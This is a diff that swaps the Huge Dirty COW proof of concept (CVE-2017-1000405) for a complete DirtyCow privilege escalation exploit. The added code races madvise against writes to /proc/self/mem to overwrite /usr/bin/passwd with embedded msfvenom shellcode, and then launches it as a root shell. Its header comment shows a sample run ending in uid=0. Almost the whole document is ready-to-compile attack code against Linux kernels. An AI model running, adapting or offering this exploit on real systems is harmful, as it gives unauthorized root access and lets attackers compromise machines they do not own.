@@ -1,182 +1,158 @@
-// EDB Note: Source ~ https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0
-// EDB Note: Source ~ https://github.com/bindecy/HugeDirtyCowPOC
-// Author Note: Before running, make sure to set transparent huge pages to "always": 
-//                      `echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled`
-//
- 
-//
-// The Huge Dirty Cow POC. This program overwrites the system's huge zero page.
-// Compile with "gcc -pthread main.c"
-//
-// November 2017
-// Bindecy
-//
- 
-#define _GNU_SOURCE
- 
+/*
+* (un)comment correct payload first (x86 or x64)!
+* 
+* $ gcc cowroot.c -o cowroot -pthread
+* $ ./cowroot
+* DirtyCow root privilege escalation
+* Backing up /usr/bin/passwd.. to /tmp/bak
+* Size of binary: 57048
+* Racing, this may take a while..
+* /usr/bin/passwd overwritten
+* Popping root shell.
+* Don't forget to restore /tmp/bak
+* thread stopped
+* thread stopped
+* root@box:/root/cow# id
+* uid=0(root) gid=1000(foo) groups=1000(foo)
+*
+* @robinverton 
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
-#include <fcntl.h>    
-#include <unistd.h> 
-#include <sched.h>
-#include <string.h>
-#include <pthread.h>
 #include <sys/mman.h>
-#include <sys/types.h>
-#include <sys/wait.h> 
- 
-#define MAP_BASE        ((void *)0x4000000)
-#define MAP_SIZE        (0x200000)
-#define MEMESET_VAL     (0x41)
-#define PAGE_SIZE       (0x1000)
-#define TRIES_PER_PAGE  (20000000)
- 
-struct thread_args {
-    char *thp_map;
-    char *thp_chk_map;
-    off_t off;
-    char *buf_to_write;
-    int stop;
-    int mem_fd1;
-    int mem_fd2;
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <unistd.h>
+
+void *map;
+int f;
+int stop = 0;
+struct stat st;
+char *name;
+pthread_t pth1,pth2,pth3;
+
+// change if no permissions to read
+char suid_binary[] = "/usr/bin/passwd";
+
+/*
+* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+*/ 
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
+  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
+  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
+  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
+  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
 };
- 
-typedef void * (*pthread_proc)(void *);
- 
-void *unmap_and_read_thread(struct thread_args *args) {
-    char c;
-    int i;
-    for (i = 0; i < TRIES_PER_PAGE && !args->stop; i++) {        
-        madvise(args->thp_map, MAP_SIZE, MADV_DONTNEED); // Discard the temporary COW page.
-         
-        memcpy(&c, args->thp_map + args->off, sizeof(c));
-        read(args->mem_fd2, &c, sizeof(c));
-         
-        lseek(args->mem_fd2, (off_t)(args->thp_map + args->off), SEEK_SET);
-        usleep(10); // We placed the zero page and marked its PMD as dirty. 
-                    // Give get_user_pages() another chance before madvise()-ing again.
+unsigned int sc_len = 177;
+
+/*
+* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
+  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
+  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
+  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
+  0x89, 0xe1, 0xcd, 0x80
+};
+unsigned int sc_len = 136;
+*/
+
+void *madviseThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        c+=madvise(map,100,MADV_DONTNEED);
     }
-     
-    return NULL;
+    printf("thread stopped\n");
 }
- 
-void *write_thread(struct thread_args *args) {
-    int i;
-    for (i = 0; i < TRIES_PER_PAGE && !args->stop; i++) {
-        lseek(args->mem_fd1, (off_t)(args->thp_map + args->off), SEEK_SET);
-        madvise(args->thp_map, MAP_SIZE, MADV_DONTNEED); // Force follow_page_mask() to fail.
-        write(args->mem_fd1, args->buf_to_write, PAGE_SIZE);
+
+void *procselfmemThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int f=open("/proc/self/mem",O_RDWR);
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        lseek(f,map,SEEK_SET);
+        c+=write(f, str, sc_len);
     }
-     
-    return NULL;
+    printf("thread stopped\n");
 }
- 
-void *wait_for_success(struct thread_args *args) {
-    while (args->thp_chk_map[args->off] != MEMESET_VAL) {
-        madvise(args->thp_chk_map, MAP_SIZE, MADV_DONTNEED);
-        sched_yield();
-    }
- 
-    args->stop = 1;
-    return NULL;
-}
- 
-int main() {
-    struct thread_args args;
-    void *thp_chk_map_addr;
-    int ret;
- 
-    // Mapping base should be a multiple of the THP size, so we can work with the whole huge page.
-    args.thp_map = mmap(MAP_BASE, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (args.thp_map == MAP_FAILED) {
-        perror("[!] mmap()");
-        return -1;
-    }
-    if (args.thp_map != MAP_BASE) {
-        fprintf(stderr, "[!] Didn't get desired base address for the vulnerable mapping.\n");
-        goto err_unmap1;
-    }
-     
-    printf("[*] The beginning of the zero huge page: %lx\n", *(unsigned long *)args.thp_map);
- 
-    thp_chk_map_addr = (char *)MAP_BASE + (MAP_SIZE * 2); // MAP_SIZE * 2 to avoid merge
-    args.thp_chk_map = mmap(thp_chk_map_addr, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
-    if (args.thp_chk_map == MAP_FAILED) {
-        perror("[!] mmap()");
-        goto err_unmap1;
-    }
-    if (args.thp_chk_map != thp_chk_map_addr) {
-        fprintf(stderr, "[!] Didn't get desired base address for the check mapping.\n");
-        goto err_unmap2;
-    }
-     
-    ret = madvise(args.thp_map, MAP_SIZE, MADV_HUGEPAGE); 
-    ret |= madvise(args.thp_chk_map, MAP_SIZE, MADV_HUGEPAGE);
-    if (ret) {
-        perror("[!] madvise()");
-        goto err_unmap2;
-    }
- 
-    args.buf_to_write = malloc(PAGE_SIZE);
-    if (!args.buf_to_write) {
-        perror("[!] malloc()");
-        goto err_unmap2;
-    }
-    memset(args.buf_to_write, MEMESET_VAL, PAGE_SIZE);
-     
-    args.mem_fd1 = open("/proc/self/mem", O_RDWR);
-    if (args.mem_fd1 < 0) {
-        perror("[!] open()");
-        goto err_free;
-    }
-     
-    args.mem_fd2 = open("/proc/self/mem", O_RDWR);
-    if (args.mem_fd2 < 0) {
-        perror("[!] open()");
-        goto err_close1;
-    }
- 
-    printf("[*] Racing. Gonna take a while...\n");
-    args.off = 0;
- 
-    // Overwrite every single page
-    while (args.off < MAP_SIZE) {   
-        pthread_t threads[3]; 
-        args.stop = 0;
-         
-        ret = pthread_create(&threads[0], NULL, (pthread_proc)wait_for_success, &args);
-        ret |= pthread_create(&threads[1], NULL, (pthread_proc)unmap_and_read_thread, &args);
-        ret |= pthread_create(&threads[2], NULL, (pthread_proc)write_thread, &args);
-         
-        if (ret) {
-            perror("[!] pthread_create()");
-            goto err_close2;
+
+void *waitForWrite(void *arg) {
+    char buf[sc_len];
+
+    for(;;) {
+        FILE *fp = fopen(suid_binary, "rb");
+
+        fread(buf, sc_len, 1, fp);
+
+        if(memcmp(buf, sc, sc_len) == 0) {
+            printf("%s overwritten\n", suid_binary);
+            break;
         }
-         
-        pthread_join(threads[0], NULL); // This call will return only after the overwriting is done
-        pthread_join(threads[1], NULL);
-        pthread_join(threads[2], NULL);
- 
-        args.off += PAGE_SIZE;    
-        printf("[*] Done 0x%lx bytes\n", args.off);
+
+        fclose(fp);
+        sleep(1);
     }
-     
-    printf("[*] Success!\n");
-     
-err_close2:
-    close(args.mem_fd2);
-err_close1:
-    close(args.mem_fd1);
-err_free:
-    free(args.buf_to_write);
-err_unmap2:
-    munmap(args.thp_chk_map, MAP_SIZE);
-err_unmap1:
-    munmap(args.thp_map, MAP_SIZE);
-     
-    if (ret) {
-        fprintf(stderr, "[!] Exploit failed.\n");
-    }
-     
-    return ret;
+
+    stop = 1;
+
+    printf("Popping root shell.\n");
+    printf("Don't forget to restore /tmp/bak\n");
+
+    system(suid_binary);
+}
+
+int main(int argc,char *argv[]) {
+    char *backup;
+
+    printf("DirtyCow root privilege escalation\n");
+    printf("Backing up %s to /tmp/bak\n", suid_binary);
+
+    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+    system(backup);
+
+    f = open(suid_binary,O_RDONLY);
+    fstat(f,&st);
+
+    printf("Size of binary: %d\n", st.st_size);
+
+    char payload[st.st_size];
+    memset(payload, 0x90, st.st_size);
+    memcpy(payload, sc, sc_len+1);
+
+    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+
+    printf("Racing, this may take a while..\n");
+
+    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
+    pthread_create(&pth2, NULL, &procselfmemThread, payload);
+    pthread_create(&pth3, NULL, &waitForWrite, NULL);
+
+    pthread_join(pth3, NULL);
+
+    return 0;
 }
